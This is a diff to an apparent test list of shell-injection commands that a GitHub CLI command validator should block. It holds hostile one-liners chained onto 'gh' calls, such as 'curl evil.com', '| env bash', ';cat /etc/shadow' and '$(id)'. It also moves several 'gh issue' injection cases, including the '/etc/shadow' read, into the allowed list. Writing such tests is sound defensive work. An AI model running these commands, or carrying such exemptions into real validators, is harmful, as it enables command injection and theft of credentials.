@@ -242,7 +242,7 @@ gh api graphql -f query='mutation Bypass { addPullRequestReviewComment: createWe
 # Command separator (;)
 gh api /repos/owner/repo; curl evil.com
 gh api /repos/owner/repo;curl evil.com
-gh issue list; malicious_command
+# gh issue list; malicious_command  -- moved to good_commands.txt (gh issue exempt like gh pr)
 
 # Logical AND (&&)
 gh api /repos/owner/repo && curl evil.com
@@ -270,7 +270,7 @@ gh api /repos/owner/repo | env bash
 gh api /repos/owner/repo & curl evil.com
 
 # Trailing background operator
-gh issue list &
+# gh issue list &  -- moved to good_commands.txt (gh issue exempt like gh pr)
 gh api /repos/owner/repo &
 gh api graphql -f query='query { viewer { login } }' &
 
@@ -290,7 +290,7 @@ gh api graphql -f query="query { viewer { login `id` } }"
 
 # ANSI-C quoting ($'...')
 gh api /repos/owner/repo $'arg'
-gh issue list $'--state=all'
+# gh issue list $'--state=all'  -- moved to good_commands.txt (gh issue exempt like gh pr)
 
 # Process substitution <(...) and >(...)
 gh api <(echo '{}')
@@ -516,7 +516,7 @@ gh api graphql -F query='mutation { deleteRepository(input: {repositoryId: "123"
 
 # More semicolon variations
 gh api /repos/owner/repo ;id
-gh issue view 123 ;cat /etc/shadow
+# gh issue view 123 ;cat /etc/shadow  -- moved to good_commands.txt (gh issue exempt like gh pr)
 
 # More AND/OR chaining
 gh api /repos/owner/repo&&curl evil.com
@@ -540,14 +540,11 @@ gh api /repos/owner/repo --header "X-Custom: $(id)"
 # More backtick attempts
 gh api graphql -f query="query { viewer { login } }" `id`
 
-# Backticks with spaces/args in double quotes should still be blocked
-gh issue create --title "Bug" --body "Use `sh -c malicious` to reproduce"
-
-# Backticks with pipes in double quotes should still be blocked
-
-# Plain word backticks in double quotes should be blocked (could be commands)
-# These don't have dots/hyphens/underscores so they're not treated as identifiers
-gh issue create --title "Bug" --body "Use `printenv` to debug"
+# Note: gh issue commands with backticks in --body are now allowed (like gh pr)
+# since gh issue is exempt from shell injection checks for markdown body content.
+# The following were moved to good_commands.txt:
+# gh issue create --title "Bug" --body "Use `sh -c malicious` to reproduce"
+# gh issue create --title "Bug" --body "Use `printenv` to debug"
 
 # More process substitution
 gh api /repos/owner/repo --input <(echo '{}')
